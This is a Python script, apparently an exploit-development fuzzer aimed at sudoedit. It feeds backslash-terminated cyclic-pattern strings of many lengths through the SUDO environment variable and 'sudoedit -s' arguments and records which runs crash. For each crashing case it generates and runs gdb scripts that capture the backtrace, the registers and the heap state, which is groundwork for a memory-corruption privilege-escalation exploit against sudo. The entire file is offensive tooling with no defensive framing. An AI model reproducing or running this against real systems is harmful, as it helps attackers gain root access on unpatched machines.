#!/usr/bin/env python

from itertools import permutations
import time
import os
import subprocess
import pwn
import sys
from shlex import split, join

def getc(l):
    return pwn.cyclic(l, n=8).decode('utf-8')

def doit(envl, bufl, i):
  e = getc(envl)
  b = getc(bufl)
  c = "-A -s '{}\\{}\\'".format(b, e)
  s = split("env -i EDITOR=/usr/bin/false 'SUDO={}{}\\' /usr/bin/sudoedit {}".format('\\'*envl, e, c))

  output = subprocess.run(s, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=False)

  if output.returncode == -6:
      sys.stdout.write(".")
      return

  if b"File name too long" in output.stderr:
      sys.stdout.write("!")
      return

  if output.returncode != -127:
    with open('iteration_{}-{}-{}_code_{}.txt'.format(i,envl, bufl, abs(output.returncode)), 'wb') as fh:
      fh.write(output.stderr)
      fh.write(bytes(join(s), 'utf8'))

    gdbscript = 'iteration_{}-{}-{}_code_{}.py'.format(i,envl, bufl, abs(output.returncode))

    with open(gdbscript, 'wb') as fh:
      print(e,b, 'iteration_{}-{}-{}_code_{}.py'.format(i,envl, bufl, abs(output.returncode)))
      fh.write(b'import gdb\n')
      fh.write(b'gdb.execute("unset environment")\n')
      fh.write(b'gdb.execute("set environment EDITOR=/usr/bin/false")\n')
      fh.write(bytes('gdb.execute("set environment SUDO=\'{}{}\\\\\'")\n'.format('\\\\'*envl, getc(envl)), 'utf8'))
      fh.write(b'gdb.execute("file /usr/bin/sudoedit")\n')
      fh.write(bytes('gdb.execute("r -A -s \'{}\\\\{}\\\\\'")\n'.format(b,e), 'utf8'))
      fh.write(b'try:\n')
      fh.write(bytes('  with open("iteration_{}-{}-{}_code_{}_gdb_env", "wb") as fh:\n'.format(i,envl, bufl, abs(output.returncode)), 'utf-8'))
      fh.write(b'    fh.write(bytes(gdb.execute("show environment", to_string=True),"utf-8"))\n')
      fh.write(bytes('  with open("iteration_{}-{}-{}_code_{}_gdb_bt", "wb") as fh:\n'.format(i,envl, bufl, abs(output.returncode)), 'utf-8'))
      fh.write(b'    fh.write(bytes(gdb.execute("bt full", to_string=True), "utf-8"))\n')
      fh.write(bytes('  with open("iteration_{}-{}-{}_code_{}_gdb_ir", "wb") as fh:\n'.format(i,envl, bufl, abs(output.returncode)), 'utf-8'))
      fh.write(b'    fh.write(bytes(gdb.execute("i r", to_string=True), "utf-8"))\n')
      fh.write(bytes('  with open("iteration_{}-{}-{}_code_{}_gdb_heap", "wb") as fh:\n'.format(i,envl, bufl, abs(output.returncode)), 'utf-8'))
      fh.write(b'    fh.write(bytes(gdb.execute("heap chunks", to_string=True), "utf-8"))\n')
      fh.write(b'except Exception:\n')
      fh.write(b'  pass\n')
      fh.write(b'gdb.execute("quit")\n')
      os.fsync(fh)
    subprocess.check_output("/usr/bin/gdb -q -x {}".format(gdbscript), timeout=4, shell=True)

if __name__ == '__main__':
    perm = permutations(range(1,500), 2)
    i = 0

    for j in list(perm):
      i=i+1
      doit(j[1], j[0], i)
